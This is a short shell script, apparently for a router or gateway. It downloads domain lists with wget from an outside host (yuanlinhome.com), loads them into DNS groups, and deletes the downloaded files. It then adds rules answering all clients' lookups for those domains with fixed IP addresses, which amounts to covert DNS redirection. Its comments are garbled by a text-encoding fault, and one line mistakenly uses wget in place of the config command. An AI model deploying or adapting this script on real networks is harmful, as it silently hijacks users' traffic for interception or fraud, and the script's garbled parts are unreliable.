#! /bin/sh
config dns rmvgrp 16
config dns rmvgrp 17
config dns rmvgrp 18
config dns rmvgrp 19
config dns addgrp 17 webwwurl
//���ز�װ���������
wget http://yuanlinhome.com/kefu.txt
cp kefu.txt /kefu1.txt
wget dns loadfile 17 /kefu1.txt
rm -rf kefu.txt
rm -rf /kefu1.txt
config dns addgrp 18 webwurl
//���ز�װ���������
wget http://yuanlinhome.com/bc.txt
cp bc.txt /bc1.txt
config dns loadfile 18 /bc1.txt
rm -rf bc.txt
rm -rf /bc1.txt
//�ض��������Ƿ�Ĳ��
config dns addrule id=864 inip=any dns=18 outip=any action=reply actarg=101.102.225.211
config dns addrule id=964 inip=any dns=17 outip=any action=reply actarg=101.102.225.209
